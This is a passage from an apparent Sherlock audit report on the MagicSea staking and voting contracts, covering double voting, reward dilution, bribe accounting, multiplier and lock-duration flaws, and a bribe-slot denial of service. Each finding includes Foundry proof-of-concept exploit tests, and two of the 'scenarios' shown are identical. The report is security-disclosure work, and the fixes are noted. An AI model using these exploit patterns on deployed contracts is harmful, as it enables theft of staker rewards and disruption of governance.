        require(amount != 0, "zero amount"); // createPosition: amount cannot be null

        // mint NFT position token
        uint256 currentTokenId = _mintNextTokenId(msg.sender);

        // calculate bonuses
        uint256 lockMultiplier = getMultiplierByLockDuration(lockDuration);
        uint256 amountWithMultiplier = amount * (lockMultiplier + 1e4) / 1e4;

        // create position
        _stakingPositions[currentTokenId] = StakingPosition({
            initialLockDuration: lockDuration,
            amount: amount,
            rewardDebt: amountWithMultiplier * (_accRewardsPerShare) / (PRECISION_FACTOR),
            lockDuration: lockDuration,
            startLockTime: _currentBlockTimestamp(),
            lockMultiplier: lockMultiplier,
            amountWithMultiplier: amountWithMultiplier,
            totalMultiplier: lockMultiplier
        });

        // update total lp supply
        _stakedSupply = _stakedSupply + amount;
        _stakedSupplyWithMultiplier = _stakedSupplyWithMultiplier + amountWithMultiplier;

        emit CreatePosition(currentTokenId, amount, lockDuration);
    }
```

## Proof of Concept

Scenario 1:

```solidity
function testGT_vote_twice_with_the_same_stake() public {
        vm.prank(DEV);
        _voter.updateMinimumLockTime(2 weeks);

        _stakingToken.mint(ALICE, 1 ether);

        vm.startPrank(ALICE);
        _stakingToken.approve(address(_pool), 1 ether);
        _pool.createPosition(1 ether, 2 weeks);
        vm.stopPrank();

        skip(1 weeks);

        vm.prank(DEV);
        _voter.startNewVotingPeriod();

        vm.startPrank(ALICE);
        _voter.vote(1, _getDummyPools(), _getDeltaAmounts());
        vm.expectRevert(IVoter.IVoter__AlreadyVoted.selector);
        _voter.vote(1, _getDummyPools(), _getDeltaAmounts());
        vm.stopPrank();

        assertEq(_voter.getTotalVotes(), 1 ether);

        skip(1 weeks + 1);

        vm.startPrank(ALICE);
        _pool.withdrawFromPosition(1, 1 ether);
        vm.stopPrank();

        vm.startPrank(ALICE);
        vm.expectRevert();
        _voter.vote(1, _getDummyPools(), _getDeltaAmounts());
        _stakingToken.approve(address(_pool), 1 ether);
        _pool.createPosition(1 ether, 2 weeks);
        _voter.vote(2, _getDummyPools(), _getDeltaAmounts());
        vm.stopPrank();

        assertEq(_voter.getTotalVotes(), 2 ether);
    }
```

Scenario 2:

```solidity
function testGT_vote_twice_with_the_same_stake() public {
        vm.prank(DEV);
        _voter.updateMinimumLockTime(2 weeks);

        _stakingToken.mint(ALICE, 1 ether);

        vm.startPrank(ALICE);
        _stakingToken.approve(address(_pool), 1 ether);
        _pool.createPosition(1 ether, 2 weeks);
        vm.stopPrank();

        skip(1 weeks);

        vm.prank(DEV);
        _voter.startNewVotingPeriod();

        vm.startPrank(ALICE);
        _voter.vote(1, _getDummyPools(), _getDeltaAmounts());
        vm.expectRevert(IVoter.IVoter__AlreadyVoted.selector);
        _voter.vote(1, _getDummyPools(), _getDeltaAmounts());
        vm.stopPrank();

        assertEq(_voter.getTotalVotes(), 1 ether);

        skip(1 weeks + 1);

        vm.startPrank(ALICE);
        _pool.withdrawFromPosition(1, 1 ether);
        vm.stopPrank();

        vm.startPrank(ALICE);
        vm.expectRevert();
        _voter.vote(1, _getDummyPools(), _getDeltaAmounts());
        _stakingToken.approve(address(_pool), 1 ether);
        _pool.createPosition(1 ether, 2 weeks);
        _voter.vote(2, _getDummyPools(), _getDeltaAmounts());
        vm.stopPrank();

        assertEq(_voter.getTotalVotes(), 2 ether);
    }
```

## Impact

A user can vote with stale staking position, then withdraw the staking position with any consequences. 
Additionally, a user can periodically vote twice with the same balance of staking tokens for the same pool to increase unfairly the chance of the pool being selected for further processing.

## Code Snippet

https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/Voter.sol#L172
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/Voter.sol#L175

## Tool used

Manual Review

## Recommendation

It is recommended to enforce the invariant that the remaining lock period must be longer than the epoch time to be eligible for voting.
Additionally, It is recommended to prevent double voting at any time. One of the solution can be to prevent voting within the epoch if staking position was not created before epoch started.



## Discussion

**0xSmartContract**

The vulnerability identified involves the voting mechanism within the `Voter` contract that allows users to vote using staked positions in the `MlumStaking` contract. 

The issue arises because the contract does not validate if the remaining lock period of a staking position is longer than the voting epoch. As a result, users can vote with a staking position that has a lock period ending within the voting epoch, allowing potential double voting by.


This vulnerability can lead to:
- Voting with stale staking positions.
- Double voting within the same epoch, thus skewing the vote results unfairly.
- Breaking the invariant that each stake amount should only vote once per epoch.



The `vote` function currently checks:
1. The ownership of the tokenId.
2. If the user has already voted in the current period.
3. The initial lock duration and current lock duration against minimum thresholds.

However, it fails to ensure that the remaining lock period exceeds the epoch time, allowing potential manipulation as described.

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/metropolis-exchange/magicsea-staking/pull/25


# Issue M-1: New staking positions still gets the full reward amount as with old stakings, diluting rewards for old stakers 

Source: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/74 

## Found by 
DPS, LeFy, PUSH0, Yashar, dany.armstrong90, minhquanym, oualidpro, qmdddd, scammed, sh0velware, utsav, zarkk01
## Summary

New staking positions still gets the full reward amount as with old stakings, diluting rewards for old stakers. Furthermore, due to the way multipliers are calculated, extremely short stakings are still very effective in stealing long-term stakers' rewards.

## Vulnerability Detail

In the Magic LUM Staking system, users can lock-stake MLUM in exchange for voting power, as well as a share of the protocol revenue. As per the [docs](https://docs.magicsea.finance/protocol/magic/magic-lum-staking):

> You can stake and lock your Magic LUM token in the Magic LUM staking pools to benefit from protocol profits. All protocol returns like a part of the trading fees, Fairlaunch listing fees, and NFT trading fees flow into the staking pool in form of USDC. 
>
> Rewards are distributed every few days, and you can Claim at any time.

However, when rewards are distributed, new and old staking positions are treated alike, and immediately receive the same rewards as it is distributed.

Thus, anyone can stake MLUM for a short duration as rewards are distributed, and siphon away rewards from long-term stakers. Staking for a few days still gets almost the same multiplier as staking for a year, and the profitability can be calculated and timed by calculating the protocol's revenue using various offchain methods (e.g. watching the total trade volume in each time intervals).

Consider the following scenario:
- Alice stakes 50 MLUM for a year.
- Bob has 50 MLUM but hasn't staked.
- Bob notices that there is a spike in trading activity, and the protocol is gaining a lot of trading volume in a short time (thereby gaining a lot of revenue).
- Bob stakes 50 MLUM for 1 second.
- As soon as the rewards are distributed, Bob can harvest his part immediately.

Note that expired positions, while should not be able to vote, still accrue rewards. Thus Bob can just leave the position there and withdraw whenever he wants to without watching the admin actions. A more sophisticated attack involves front-running the admin reward distribution to siphon rewards, then unstake right away.

## PoC

Due to the way multipliers are calculated, 1-year lock positions are only at most 3 times stronger than a 1-second lock for the same amount of MLUM.

The following coded PoC shows the given scenario, where Bob is able to siphon 25% of the rewards away by staking for a duration of a single second and leave it there. 

Paste the following test into `MlumStaking.t.sol`, and run it by `forge test --match-test testPoCHarvestDilute -vv`:

```solidity
function testPoCHarvestDilute() public {
    _stakingToken.mint(ALICE, 100 ether);
    _stakingToken.mint(BOB, 100 ether);

    vm.startPrank(ALICE);
    _stakingToken.approve(address(_pool), 50 ether);
    _pool.createPosition(50 ether, 365 days);
    vm.stopPrank();

    vm.startPrank(BOB);
    _stakingToken.approve(address(_pool), 50 ether);
    _pool.createPosition(50 ether, 1);
    vm.stopPrank();

    _rewardToken.mint(address(_pool), 100 ether);

    skip(100); // Bob can stake anytime and then just wait

    vm.prank(ALICE);
    _pool.harvestPosition(1);
    vm.prank(BOB);
    _pool.harvestPosition(2);

    console.logUint(_rewardToken.balanceOf(ALICE));
    console.logUint(_rewardToken.balanceOf(BOB));
}
```

The test logs will be
```txt
Ran 1 test for test/MlumStaking.t.sol:MlumStakingTest
[PASS] testPoCHarvestDilute() (gas: 940195)
Logs:
  75000000000000000000
  25000000000000000000
```

i.e. Bob was able to siphon 25% of the rewards.

## Impact

Staking rewards can be stolen from honest stakers.

## Code Snippet

https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L354

## Tool used

Manual Review

## Recommendation

When new positions are created, their position should be recorded, but their amount with multipliers should be summed up and queued until the next reward distribution.

When the admin distributes rewards, there should be a function that first updates the pool, then add the queued amounts into staking. That way, newly created positions can still vote, but they do not accrue rewards for the immediate following distribution (only the next one onwards). 
- One must note down the timestamp that the position was created (as well as the timestamp the rewards were last distributed), so that when the position unstakes, the contract knows whether to burn the unstaked shares from the queued shares pool or the active shares pool.

 



## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/metropolis-exchange/magicsea-staking/pull/7


# Issue M-2: Voter receives the bribe reward for `all` voting period, regardless of how many votingPeriod he voted for 

Source: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/114 

## Found by 
0xAsen, Silvermist, anonymousjoe, araj, dhank, utsav
## Summary
Voter receives the bribe reward for `all` voting period, regardless of how many votingPeriod he voted for

## Vulnerability Detail
When a user `votes` for a pool, bribeRewarder of that pool `stores` the amounts of vote user voted in that votingPeriod using `Amounts::update()`
```solidity
 function _notifyBribes(uint256 periodId, address pool, uint256 tokenId, uint256 deltaAmount) private {
...
          @>   rewarders[i].deposit(periodId, tokenId, deltaAmount);
                _userBribesPerPeriod[periodId][tokenId].push(rewarders[i]);
            }
    }
```
```solidity
 function deposit(uint256 periodId, uint256 tokenId, uint256 deltaAmount) public onlyVoter {
    @>    _modify(periodId, tokenId, deltaAmount.toInt256(), false);
    }
```
```solidity
 function _modify(uint256 periodId, uint256 tokenId, int256 deltaAmount, bool isPayOutReward) {
....
    @>    (uint256 oldBalance, uint256 newBalance, uint256 oldTotalSupply,) = amounts.update(tokenId, deltaAmount);
....
    }
```
When a voter `claim` for his rewards, it `loops` over _modify() from `_startVotingPeriod` to `lastEndedVotingPeriod` & _modify() calculates the `rewardAmount`(based on deltaAmount or voteAmount) and transfers it to user.

But the problem is it `assumes` user has voted for `all` voting period because `balances` returned by `Amount.update()` is `same` for all votingPeriod as it only stores `total` votes but doesn't stores how many `votes` user voted in a `particular` votingPeriod. As result `votes` voted in a `particular` votingPeriod is `used` for all votingPeriod
```solidity
  function claim(uint256 tokenId) external override {
        uint256 endPeriod = IVoter(_caller).getLatestFinishedPeriod();
...
        for (uint256 i = _startVotingPeriod; i <= endPeriod; ++i) {
        @>    totalAmount += _modify(i, tokenId, 0, true);
        }
    }
```
```solidity
function _modify(uint256 periodId, uint256 tokenId, int256 deltaAmount, bool isPayOutReward){
...
   @>     (uint256 oldBalance, uint256 newBalance, uint256 oldTotalSupply,) = amounts.update(tokenId, deltaAmount);

        uint256 totalRewards = _calculateRewards(periodId);

     @>   rewardAmount = rewarder.update(bytes32(tokenId), oldBalance, newBalance, oldTotalSupply, totalRewards);
...
        if (isPayOutReward) {
            rewardAmount = rewardAmount + unclaimedRewards[periodId][tokenId];
            unclaimedRewards[periodId][tokenId] = 0;
            if (rewardAmount > 0) {
                IERC20 token = _token();
        @>        _safeTransferTo(token, msg.sender, rewardAmount);
            }
        } else {
            unclaimedRewards[periodId][tokenId] += rewardAmount;
        }
    }
```
//How this works(very simple example & step-by-step)
1. Suppose a bribeRewarder is created for poolA from 1st votingPeriod to 5th votingPeriod ie startVotingPeriod = 1 & lastVotingPeriod = 5
2. A user voted in 1st votingPeriod for poolA for voteAmount = 2e18, which stores the voteAmount in bribeRewarder using `Amount::update()` (oldAmount = 0, newAmount = 2e18, oldTotalAmount = 0, newTotalAmount = 2e18)
```solidity
 function update(Parameter storage amounts, bytes32 key, int256 deltaAmount)
        internal
        returns (uint256 oldAmount, uint256 newAmount, uint256 oldTotalAmount, uint256 newTotalAmount)
    {
        oldAmount = amounts.amounts[key];
        oldTotalAmount = amounts.totalAmount;

        if (deltaAmount == 0) {
            newAmount = oldAmount;
            newTotalAmount = oldTotalAmount;
        } else {
            newAmount = oldAmount.addDelta(deltaAmount);
            newTotalAmount = oldTotalAmount.addDelta(deltaAmount);

            amounts.amounts[key] = newAmount;
            amounts.totalAmount = newTotalAmount;
        }
    }
```
3. After 5th votingPeriod, user claims his bribe rewards which run the loop on _modify() from 1(startId) to 5(lastId) (See above claim() )
4. For 1st votingPeriod, amounts.update() will return all balances(oldAmount = 2e18, newAmount = 2e18, oldTotalAmount = 2e18, newTotalAmount = 2e18) & _calculateRewards() will return the totalRewards and all those will be used in rewarder.update() to calculate rewardAmount that will be sent to user
```solidity
 rewardAmount = rewarder.update(bytes32(tokenId), oldBalance, newBalance, oldTotalSupply, totalRewards);
```
5. Again for 2nd votingPeriod, amounts.update() will return all balances(oldAmount = 2e18, newAmount = 2e18, oldTotalAmount = 2e18, newTotalAmount = 2e18) and same thing will happen as above for all votingPeriod

All this is happening because bribeRewarder is only storing `totalVotes` of user but  `not` storing how many `votes` user voted in a `particular` votingPeriod. As result rewarder `assumes` user has voted for all votingPeriod


## Impact
User will receive rewards for all votingPeriod even though he voted for it or not

## Code Snippet
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/rewarders/BribeRewarder.sol#L153C4-L164C6
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/rewarders/BribeRewarder.sol#L260C3-L298C6
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/rewarders/BribeRewarder.sol#L300C4-L313C6

## Tool used
Manual Review

## Recommendation
Use mapping to store users vote as per votingPeriod and use while claiming



## Discussion

**0xSmartContract**

Even though the user voted for only one voting period, the total reward he receives is calculated based on the reward rate for all voting periods.

In this case, the user also receives rewards for the periods in which he did not vote.

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/metropolis-exchange/magicsea-staking/pull/20


# Issue M-3: Calling `setLockMultiplierSettings` After Staking Leads to Potential Unfair Reward Distribution 

Source: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/125 

## Found by 
0uts1der, Honour, PUSH0, Reentrants, Shubham, aslanbek, bbl4de, blackhole, dany.armstrong90, dimulski, jah, minhquanym, radin200, sh0velware
## Summary

The `MlumStaking` contract initializes the `_maxLockMultiplier` with an incorrect value of 20000 (200%), which exceeds the defined constant `MAX_LOCK_MULTIPLIER_LIMIT` of 15000 (150%). This mismatch can lead to unintended and potentially unfair reward distributions among stakers when the multiplier is corrected after staking has begun.

## Vulnerability Detail

In the `MlumStaking` contract, there exists a variable `MAX_LOCK_MULTIPLIER_LIMIT` initially set to 15000 (note that there are no functions to modify this variable, meaning it is immutable). According to the CODE COMMENTS, this indicates a 150% multiplier, which is the upper limit for `maxLockMultiplier`.
```solidity
uint256 public constant MAX_LOCK_MULTIPLIER_LIMIT = 15000; // 150%, high limit for maxLockMultiplier (100 = 1%)
```

This is further confirmed by the `setLockMultiplierSettings` function's CODE COMMENTS and code, which ensure that `_maxLockMultiplier` cannot exceed `MAX_LOCK_MULTIPLIER_LIMIT`.
```solidity
    /**
     * @dev Set lock multiplier settings
     *
     * maxLockMultiplier must be <= MAX_LOCK_MULTIPLIER_LIMIT
     * maxLockMultiplier must be <= _maxGlobalMultiplier - _maxBoostMultiplier
     *
     * Must only be called by the owner
     */
    function setLockMultiplierSettings(uint256 maxLockDuration, uint256 maxLockMultiplier) external {
        require(msg.sender == owner() || msg.sender == _operator, "FORBIDDEN");
        require(maxLockMultiplier <= MAX_LOCK_MULTIPLIER_LIMIT, "too high");
        _maxLockDuration = maxLockDuration;
        _maxLockMultiplier = maxLockMultiplier;

        emit SetLockMultiplierSettings(maxLockDuration, maxLockMultiplier);
    }
```

However, `_maxLockMultiplier` was incorrectly initialized to 20000, or 200%, exceeding the `MAX_LOCK_MULTIPLIER_LIMIT`.

The potential consequence of this erroneous setting is that once staking begins, if the team discovers the error in `_maxLockMultiplier` and wishes to amend it, it must be set to no more than 15000 (i.e., `MAX_LOCK_MULTIPLIER_LIMIT`). This could lead to a permanent unfair distribution of rewards, possibly allowing users who staked before the correction to receive more rewards compared to those who staked later.

For instance:
1. After staking begins, user A calls `createPosition` to stake 100 `stakedToken` with a `lockDuration` of 365 days, at block T. At this point, `_maxLockMultiplier` is 20000 and `_maxLockDuration` is 365 days. Therefore, according to the `getMultiplierByLockDuration` function, the position’s `lockMultiplier` is `_maxLockMultiplier`, or 20000.
```solidity
    function getMultiplierByLockDuration(uint256 lockDuration) public view returns (uint256) {
        if (isUnlocked()) return 0;
        if (_maxLockDuration == 0 || lockDuration == 0) return 0;
        if (lockDuration >= _maxLockDuration) return _maxLockMultiplier;
        return (_maxLockMultiplier * lockDuration) / (_maxLockDuration);
    }
```
Thus, the `amountWithMultiplier` is 300.
```solidity
        uint256 lockMultiplier = getMultiplierByLockDuration(lockDuration);
        uint256 amountWithMultiplier = amount * (lockMultiplier + 1e4) / 1e4;
```

2. In a later block, T+10, the team realizes the error in `_maxLockMultiplier` and calls `setLockMultiplierSettings` to correct it. Since `MAX_LOCK_MULTIPLIER_LIMIT` is 15000, the updated `_maxLockMultiplier` cannot exceed this, and let’s assume it is reset to 10000 while `maxLockDuration` remains 365 days.

3. After the update, in block T+20, user B also calls `createPosition` to stake 100 `stakedToken` with a `lockDuration` of 365 days. At this time, `_maxLockMultiplier` is 10000 and `_maxLockDuration` is 365 days. Therefore, the `lockMultiplier` for this position is 10000, making the `amountWithMultiplier` 200.

4. Clearly, staking the same 100 `stakedToken` for one year, the change in `_maxLockMultiplier` results in user A’s `amountWithMultiplier` being higher than user B's. Consequently, user A will always receive more rewardTokens than user B when rewards are calculated.

This issue arises if there are existing stakes when the `setLockMultiplierSettings` is called to modify `_maxLockMultiplier` and `maxLockDuration`, leading to an unfair distribution of rewards, where staking the same amount and duration of `stakedToken` before and after the modification yields different rewards.

Please note, although we should assume that a trustworthy owner and operator would not modify `maxLockMultiplier` and `maxLockDuration` after staking has started (to avoid unfair reward distribution), according to the related code and CODE COMMENTS (Hierarchy of truth) it is expected that `_maxLockMultiplier` should not exceed `MAX_LOCK_MULTIPLIER_LIMIT`, and since `MAX_LOCK_MULTIPLIER_LIMIT` is immutable and initialized at 15000, clearly initializing `_maxLockMultiplier` at 20000 is a mistake and not in line with the protocol’s expected behavior. This could lead to the correction of this error by the owner or operator after staking has begun, resulting in the unfair reward distribution scenario described.

## Impact

The primary impact of this issue is the potential for an unfair distribution of rewards among stakers. Users who stake before the correction of the `_maxLockMultiplier` can secure a higher multiplier (200% in this scenario), leading to a disproportionately higher reward compared to users who stake after the correction (where the multiplier would be set at 150% or lower). 

## Code Snippet

https://github.com/sherlock-audit/2024-06-magicsea/blob/42e799446595c542eff9519353d3becc50cdba63/magicsea-staking/src/MlumStaking.sol#L69-L73

https://github.com/sherlock-audit/2024-06-magicsea/blob/42e799446595c542eff9519353d3becc50cdba63/magicsea-staking/src/MlumStaking.sol#L262-L278

## Tool used

Manual Review

## Recommendation

It is recommended to modify `_maxLockDuration` to 15000, ensuring it does not exceed the expected `MAX_LOCK_MULTIPLIER_LIMIT`, and align with the behavior described in the comments. Furthermore, if staking has already begun and positions exist, modifications to `maxLockMultiplier` and `maxLockDuration` should be prohibited.

On the other hand, according to CODE COMMENTS, `maxLockMultiplier must be<=_maxGlobalMultiplier - _maxBoostMultiplier`, however, the actual code does not have corresponding logic, and it is recommended to correct it.



## Discussion

**0xSmartContract**

The `MAX_LOCK_MULTIPLIER_LIMIT` constant is set to 15_000, while the `_maxLockMultiplier` variable is initially set to 20_000. Therefore, the administrator cannot change the `_maxLockMultiplier` value within the range of 15_000 ~ 20_000.

Core invariant broke, unexpectedly high votingPower and pending rewards to the users

**0xHans1**

PR https://github.com/metropolis-exchange/magicsea-staking/pull/4

Note: From an audit in parallel this was allready found. MAX_LOCK_MULTIPLER_LIMIT is set to 20000.

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/metropolis-exchange/magicsea-staking/pull/4


# Issue M-4: `MlumStaking::addToPosition` should assing the amount multiplier based on the new lock duration instead of initial lock duration. 

Source: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/138 

## Found by 
Naresh, PUSH0, Reentrants, Smacaud, dany.armstrong90, dhank, iamnmt, jah, karsar, neon2835, qmdddd, robertodf, sheep, walter
## Summary
There are two separate issues that make necessary to assign the multiplier based on the new lock duration:
1. First, when users add tokens to their position via `MlumStaking::addToPosition`, the new remaining time for the lock duration is recalculated as the amount-weighted lock duration. However, when the remaining time for an existing deposit is 0, this term is omitted, allowing users to retain the same amount multiplier with a reduced lock time. Consider the following sequence of actions:
    - Alice creates a position by calling `MlumStaking::createPosition`depositing 1 ether and a lock time of 365 days
    - After the 365 days elapse, Alice adds another 1 ether to her position. The snippet below illustrates how the new lock time for the position is calculated:
        ```javascript
                uint256 avgDuration = (remainingLockTime *
                    position.amount +
                    amountToAdd *
                    position.initialLockDuration) / (position.amount + amountToAdd);
                position.startLockTime = _currentBlockTimestamp();
                position.lockDuration = avgDuration;

                // lock multiplier stays the same
                position.lockMultiplier = getMultiplierByLockDuration(
                    position.initialLockDuration
                );
        ```

    - The result will be: `(0*1 ether + 1 ether*365 days)/ 2 ether`, therefore Alice will need to wait just half a year, while the multiplier remains unchanged.  

2. Second, the missalignment between this function and `MlumStaking::renewLockPosition` creates an arbitrage opportunity for users, allowing them to reassign the lock multiplier to the initial duration if it is more beneficial. Consider the following scenario:

    - Alice creates a position with an initial lock duration of 365 days. The multiplier will be 3.
    - Then after 9 months, the lock duration is updated, let's say she adds to the position just 1 wei. The new lock duration is ≈ 90 days.
    - After another 30 days, she wants to renew her position for another 90 days. Then she calls `MlumStaking::renewLockPosition`. The new amount multiplier will be calculated as ≈ `1+90/365*2 < 3`.
    - Since it is not in her interest to have a lower multiplier than originally, then she adds just 1 wei to her position. The new multiplier will be 3 again.

## Vulnerability Detail

## Impact
You may find below the coded PoC corresponding to each of the aforementioned scenarios:

<details>

<summary> See PoC for scenario 1 </summary>
Place in `MlumStaking.t.sol`.

```javascript
    function testLockDurationReduced() public {
        _stakingToken.mint(ALICE, 2 ether);

        vm.startPrank(ALICE);
        _stakingToken.approve(address(_pool), 1 ether);
        _pool.createPosition(1 ether, 365 days);
        vm.stopPrank();

        // check lockduration
        MlumStaking.StakingPosition memory position = _pool.getStakingPosition(
            1
        );
        assertEq(position.lockDuration, 365 days);

        skip(365 days);

        // add to position should take calc. avg. lock duration
        vm.startPrank(ALICE);
        _stakingToken.approve(address(_pool), 1 ether);
        _pool.addToPosition(1, 1 ether);
        vm.stopPrank();

        position = _pool.getStakingPosition(1);

        assertEq(position.lockDuration, 365 days / 2);
        assertEq(position.amountWithMultiplier, 2 ether * 3);
    }
```

</details>

<details>

<summary> See PoC for scenario 2 </summary>
Place in `MlumStaking.t.sol`.

```javascript
    function testExtendLockAndAdd() public {
        _stakingToken.mint(ALICE, 2 ether);

        vm.startPrank(ALICE);
        _stakingToken.approve(address(_pool), 2 ether);
        _pool.createPosition(1 ether, 365 days);
        vm.stopPrank();

        // check lockduration
        MlumStaking.StakingPosition memory position = _pool.getStakingPosition(
            1
        );
        assertEq(position.lockDuration, 365 days);

        skip(365 days - 90 days);
        vm.startPrank(ALICE);
        _pool.addToPosition(1, 1 wei); // lock duration ≈ 90 days
        skip(30 days);
        _pool.renewLockPosition(1); // multiplier ≈ 1+90/365*2
        position = _pool.getStakingPosition(1);
        assertEq(position.lockDuration, 7776000);
        assertEq(position.amountWithMultiplier, 1493100000000000001);

        _pool.addToPosition(1, 1 wei); // multiplier = 3
        position = _pool.getStakingPosition(1);
        assertEq(position.lockDuration, 7776000);
        assertEq(position.amountWithMultiplier, 3000000000000000006);
    }
```

</details>

## Code Snippet
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L409-L417

https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L509-L514

https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L714
## Tool used

Manual Review

## Recommendation
Assign new multiplier in `MlumStaking::addToPosition` based on lock duration rather than initial lock duration.



## Discussion

**0xSmartContract**

This issue causes users to keep the same multiplier by reducing lock times, thus gaining an advantage.

This creates an unfair advantage in the system and undermines the reliability of the staking mechanism.

**0xHans1**

PR: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/138
Fixes scenario 2. 

For scenario 1: it is a design choice that the amount mutliplier stays the same even lock duration ended.

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/metropolis-exchange/magicsea-staking/pull/5


# Issue M-5: Adding genuine BribeRewarder contract instances to a pool in order to incentivize users can be DOSed 

Source: https://github.com/sherlock-audit/2024-06-magicsea-judging/issues/190 

## Found by 
0xAnmol, 0xAsen, 0xR360, DMoore, Honour, KupiaSec, MrCrowNFT, PUSH0, Reentrants, Silvermist, anonymousjoe, araj, aslanbek, blockchain555, coffiasd, dany.armstrong90, dimulski, gkrastenov, iamnmt, jennifer37, kmXAdam, oualidpro, radin200, rsam\_eth, sajjad, santipu\_, scammed, slowfi, tedox, utsav, web3pwn, zarkk01
## Summary
In the ``Voter.sol`` contract, protocols can create ``BribeRewarder.sol`` contract instances in order to bribe users to vote for the pool specified by the protocol. The more users vote for a specific pool, the bigger the weight of that pool will be compared to other pools and thus users staking the pool **LP** token in the ``MasterchefV2.sol`` contract will receive more rewards. The LP token of the pool the protocol is bribing for, receives bigger allocation of the **LUM** token in the ``MasterchefV2.sol`` contract. Thus incentivizing people to deposit tokens in the AMM associated with the LP token in order to acquire the LP token for a pool with higher weight, thus providing more liquidity in a trading pair.  In the ``Voter.sol`` contract a voting period is defined by an id, start time, and a end time which is the start time + the globaly specified **_periodDuration**. When a protocol tries to add a ``BribeRewarder.sol`` contract instance for a pool and a voting period, they have to call the [fundAndBribe()](https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/rewarders/BribeRewarder.sol#L111-L124) function or the [bribe()](https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/rewarders/BribeRewarder.sol#L132-L134) funciton and supply the required amount of reward tokens. Both of the above mentioned functions internally call the [_bribe()](https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/rewarders/BribeRewarder.sol#L226-L258) function which in turn calls the [onRegister()](https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/Voter.sol#L130-L144) function in the ``Voter.sol`` contract.  There is the following check in the [onRegister()](https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/Voter.sol#L130-L144) function:

```solidity
    function onRegister() external override {
        IBribeRewarder rewarder = IBribeRewarder(msg.sender);

        _checkRegisterCaller(rewarder);

        uint256 currentPeriodId = _currentVotingPeriodId;
        (address pool, uint256[] memory periods) = rewarder.getBribePeriods();
        for (uint256 i = 0; i < periods.length; ++i) {
            // TODO check if rewarder token + pool  is already registered

            require(periods[i] >= currentPeriodId, "wrong period");
            require(_bribesPerPriod[periods[i]][pool].length + 1 <= Constants.MAX_BRIBES_PER_POOL, "too much bribes");
            _bribesPerPriod[periods[i]][pool].push(rewarder);
        }
    }
```
[Constants.MAX_BRIBES_PER_POOL](https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/libraries/Constants.sol#L17) is equal to 5. This means that each pool can be associated with a maximum of 5 instances of the ``BribeRewarder.sol`` contract for each voting period. The problem is that adding ``BribeRewarder.sol`` contract instances for a pool for a certain voting period is permissionless. There is no whitelist for the tokens that can be used as reward tokens in the ``BribeRewarder.sol`` contract or a minimum amount of rewards that have to be distributed per each voting period. A malicious actor can just deploy an ERC20 token on the network, that have absolutely no dollar value, mint as many tokens as he wants and then deploy 5 instance of the ``BribeRewarder.sol`` contract by calling the [createBribeRewarder()](https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/rewarders/RewarderFactory.sol#L109-L113) function in the ``RewarderFactory.sol`` contract. After that he can either call [fundAndBribe()](https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/rewarders/BribeRewarder.sol#L111-L124) function or the [bribe()](https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/rewarders/BribeRewarder.sol#L132-L134) function in order to associate the above mentioned ``BribeRewarder.sol`` contract instances for a specific pool and voting period. A malicious actor can specify as many voting periods as he want. [_periodDuration](https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/Voter.sol#L100) is set to 1209600 seconds = 2 weeks on ``Voter.sol`` initialization. If a malicious actor sets ``BribeRewarder.sol`` contract instances for 100 voting periods, that means 200 weeks or almost 4 years, no other ``BribeRewarder.sol`` contract instance can be added during this period. When real rewards can't be used as incentives for users, nobody will vote for a specific pool. A malicious actor can dos all pools that can potentially be added for example by tracking what new pools are created at the [MagicSea exchange](https://docs.magicsea.finance/protocol/exchange) and then immediately performing the above specified steps, thus making the entire ``Voter.sol`` and ``BribeRewarders.sol`` contracts obsolete, as their main purpose is to incentivize users to vote for specific pools and reward them with tokens for their vote. Or a malicious actor can dos specific projects that are direct competitors of his project, thus more people will provide liquidity for an AMM he is bribing users for, this way he can also provide much less rewards and still his pool will be the most lucrative one. 

## Vulnerability Detail
[Gist](https://gist.github.com/AtanasDimulski/bc8b548900acaabaf8ccfd373a783679)

After following the steps in the above mentioned [gist](https://gist.github.com/AtanasDimulski/bc8b548900acaabaf8ccfd373a783679) add the following test to the ``AuditorTests.t.sol`` file:

```solidity
    function test_BrickRewardBribers() public {
        vm.startPrank(attacker);
        customNoValueToken.mint(attacker, 500_000e18);
        BribeRewarder rewarder = BribeRewarder(payable(address(rewarderFactory.createBribeRewarder(customNoValueToken, pool))));
        customNoValueToken.approve(address(rewarder), type(uint256).max);
        rewarder.fundAndBribe(1, 100, 100e18);

        BribeRewarder rewarder1 = BribeRewarder(payable(address(rewarderFactory.createBribeRewarder(customNoValueToken, pool))));
        customNoValueToken.approve(address(rewarder1), type(uint256).max);
        rewarder1.fundAndBribe(1, 100, 100e18);

